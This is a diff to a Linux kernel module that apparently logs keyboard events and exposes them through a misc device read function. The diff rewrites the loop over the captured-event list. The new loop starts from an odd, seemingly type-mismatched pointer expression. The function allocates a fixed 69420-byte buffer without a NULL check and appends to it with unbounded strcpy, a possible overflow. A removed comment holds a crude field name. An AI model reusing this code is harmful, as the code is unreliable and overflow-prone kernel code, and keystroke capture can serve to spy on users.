@@ -39,8 +39,8 @@ static ssize_t ft_module_keyboard_read(struct file *file, char *buff, size_t, lo
 	ft_log("Misc device read");
 	output_str = kmalloc(69420, GFP_KERNEL);
 	output_str[0] = 0;
-	head_ptr = &(g_driver->events_head->list);
-	do
+	head_ptr = &(g_driver->events_head->list->next);
+	while (head_ptr != &(g_driver->events_head->list))
 	{
 		entry = list_entry(head_ptr, struct event_struct, list);
 
@@ -49,20 +49,18 @@ static ssize_t ft_module_keyboard_read(struct file *file, char *buff, size_t, lo
 		kfree(temp_str);
 
 		head_ptr = head_ptr->next;
-	} while (head_ptr != &(g_driver->events_head->list));
-
-	printk("%s", output_str);
-
-	// iterates thru linked list and print elements
-	// struct list_head *ptr;
-	// struct test *entry;
-	// ptr = &(keylogger->list);
+	}
+	
 	// do
 	// {
-	// 	entry = list_entry(ptr, struct test, list);
-	// 	printk("[42kb] entry is %d\n", entry->gay);
-	// 	ptr = ptr->next;
-	// } while (ptr != &(keylogger->list));
+	// 	entry = list_entry(head_ptr, struct event_struct, list);
+
+	// 	temp_str = event_to_str(*entry);
+	// 	strcpy(output_str + strlen(output_str), temp_str);
+	// 	kfree(temp_str);
+
+	// 	head_ptr = head_ptr->next;
+	// } while (head_ptr != &(g_driver->events_head->list));
 	
 	if (*offset == strlen(output_str))
 	{
